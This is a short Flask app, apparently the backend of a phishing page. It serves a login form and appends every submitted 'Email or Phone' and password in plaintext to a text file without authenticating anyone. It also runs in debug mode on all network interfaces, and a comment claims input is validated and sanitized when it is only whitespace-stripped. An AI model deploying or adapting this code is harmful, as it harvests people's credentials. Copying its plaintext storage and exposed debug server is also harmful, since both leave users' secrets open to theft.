from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Validate and sanitize input before writing to a file
        email = email.strip()
        password = password.strip()

        # Store data in a text file (for demonstration purposes only)
        with open('user_data.txt', 'a') as file:
            file.write(f"Email or Phone: {email} | Password: {password}\n")

    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=True)
